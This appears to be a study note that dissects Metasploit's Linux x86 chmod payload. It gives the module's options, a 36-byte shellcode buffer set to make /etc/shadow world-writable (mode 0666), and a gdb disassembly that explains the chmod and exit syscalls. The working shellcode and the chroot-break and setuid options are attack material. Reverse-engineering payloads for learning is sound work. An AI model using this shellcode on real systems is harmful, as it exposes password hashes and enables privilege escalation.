
       Name: Linux Chmod
     Module: payload/linux/x86/chmod
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal

Provided by:
    kris katterjohn <katterjohn@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)

Description:
  Runs chmod on specified file with specified mode


    Name                Current Setting  Required  Description
    ----                ---------------  --------  -----------
    AppendExit          false            no        Append a stub that executes the exit(0) system call
    PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork         false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
    VERBOSE             false            no        Enable detailed status messages
    WORKSPACE                            no        Specify the workspace for this module
    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------

No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes
Final size of c file: 177 bytes


unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";

gdb$ disas code
Dump of assembler code for function code:

   0x56557020 <+0>:	cltd   

* sys_chmod	0x0f	const char __user *filename, mode_t mode

   0x56557021 <+1>:	push   $0xf
   0x56557023 <+3>:	pop    %eax
   0x56557024 <+4>:	push   %edx
   0x56557025 <+5>:	call   0x56557036 <code+22>

-- 
/etc/shadow string

   0x5655702a <+10>:	das    
   0x5655702b <+11>:	gs je  0x56557091
   0x5655702e <+14>:	das    
   0x5655702f <+15>:	jae    0x56557099
   0x56557031 <+17>:	popa   
   0x56557032 <+18>:	outsl  %fs:(%esi),(%dx)
--

   0x56557034 <+20>:	ja     0x56557036 <code+22>


   0x56557036 <+22>:	pop    %ebx ->>> /etc/shadow goes to ebx
   0x56557037 <+23>:	push   $0x1b6 ->>> mode sys_chmod
   0x5655703c <+28>:	pop    %ecx
   0x5655703d <+29>:	int    $0x80

exit syscall

   0x5655703f <+31>:	push   $0x1
   0x56557041 <+33>:	pop    %eax
   0x56557042 <+34>:	int    $0x80


end

   0x56557044 <+36>:	add    %al,(%eax)

again, we see that there is more after the call.

We analyize such exection:

gdb$ x/30cb 0x5655702a
0x5655702a <code+10>:	0x2f	0x65	0x74	0x63	0x2f	0x73	0x68	0x61
0x56557032 <code+18>:	0x64	0x6f	0x77	0x0	0x5b	0x68	0xb6	0x1
0x5655703a <code+26>:	0x0	0x0	0x59	0xcd	0x80	0x6a	0x1	0x58
0x56557042 <code+34>:	0xcd	0x80	0x0	0x0	0x0	0x0

Corresponding to the string /etc/shadow, one of our arguments.

The other interesting argument is    0x56557037 <+23>:    push   $0x1b6,
which corresponds to 666 in octal, that is the second parameter
of sys_chmod.


